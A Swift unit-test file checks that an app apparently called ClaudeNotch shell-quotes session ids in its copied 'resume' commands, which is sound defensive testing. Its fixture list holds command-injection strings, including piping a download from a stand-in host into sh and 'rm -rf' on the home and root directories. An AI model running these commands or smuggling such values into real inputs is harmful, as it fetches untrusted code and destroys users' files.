import XCTest
@testable import ClaudeNotch

/// "Copy resume command" hands the user a line to paste into their own shell.
/// The session id in it arrives from a hook payload or a transcript filename,
/// so it is not ours, so it gets quoted like everything else that leaves this
/// app as shell text.
@MainActor
final class ResumeCommandQuotingTests: XCTestCase {

    private let nasty = [
        "abc; curl evil.sh | sh",
        "abc && rm -rf ~",
        "abc`whoami`",
        "abc$(id)",
        "abc\nrm -rf /",
        "abc'; sh -c 'id",
        "abc | tee /tmp/x",
    ]

    func testAnOrdinarySessionIdStillReads() {
        let cmd = TerminalAutomator.resumeCommand(model: "claude-opus-4-8",
                                                  sessionId: "ad4cc893-859a-4499-bfe3-e1a4c4f27ca5")
        XCTAssertEqual(cmd, "claude --resume 'ad4cc893-859a-4499-bfe3-e1a4c4f27ca5'")
    }

    func testCodexGetsItsOwnCommand() {
        let cmd = TerminalAutomator.resumeCommand(model: "gpt-5-codex", sessionId: "abc-123")
        XCTAssertTrue(cmd.hasPrefix("codex resume "), cmd)
        XCTAssertTrue(cmd.contains("'abc-123'"), cmd)
    }

    /// The shell metacharacters that turn one command into two must all end up
    /// inside the quotes, for both agents.
    func testNothingEscapesTheQuotes() {
        for id in nasty {
            for model in ["claude-opus-4-8", "gpt-5-codex"] {
                let cmd = TerminalAutomator.resumeCommand(model: model, sessionId: id)
                let arg = String(cmd.drop { $0 != "'" })
                XCTAssertTrue(arg.hasPrefix("'"), "\(cmd)")
                XCTAssertTrue(arg.hasSuffix("'"), "\(cmd)")
                // Everything after the command word is one quoted argument, so
                // no unquoted metacharacter is left in the line.
                let head = cmd.prefix { $0 != "'" }
                for bad in [";", "&", "|", "`", "$", "\n"] {
                    XCTAssertFalse(head.contains(bad), "\(bad) survived in: \(cmd)")
                }
            }
        }
    }

    /// A quote in the id must not close the quoting and let the rest out. This
    /// is the one case a naive "wrap it in quotes" gets wrong.
    func testAnEmbeddedQuoteCannotCloseTheArgument() {
        let cmd = TerminalAutomator.resumeCommand(model: "claude-opus-4-8", sessionId: "a'; id; '")
        XCTAssertEqual(cmd, "claude --resume 'a'\\''; id; '\\'''")
    }

    /// The command actually runs, and runs as one argument. Proves the quoting
    /// against a real shell rather than against my reading of it.
    func testARealShellSeesExactlyOneArgument() throws {
        for id in nasty {
            let quoted = TerminalAutomator.shellQuote(id)
            let out = Shell.output("/bin/zsh", ["-c", "printf '%s' \(quoted)"])
            XCTAssertEqual(out, id, "shell did not see the id verbatim: \(id)")
        }
    }

    /// And nothing ran that should not have: a marker file the injected command
    /// would have created must not exist.
    func testTheInjectedCommandDoesNotRun() throws {
        let marker = FileManager.default.temporaryDirectory
            .appendingPathComponent("cn-injection-\(UUID().uuidString)")
        let id = "abc; touch \(marker.path)"
        let quoted = TerminalAutomator.shellQuote(id)
        _ = Shell.output("/bin/zsh", ["-c", "printf '%s' \(quoted)"])
        XCTAssertFalse(FileManager.default.fileExists(atPath: marker.path),
                       "the quoted id executed a second command")
    }
}
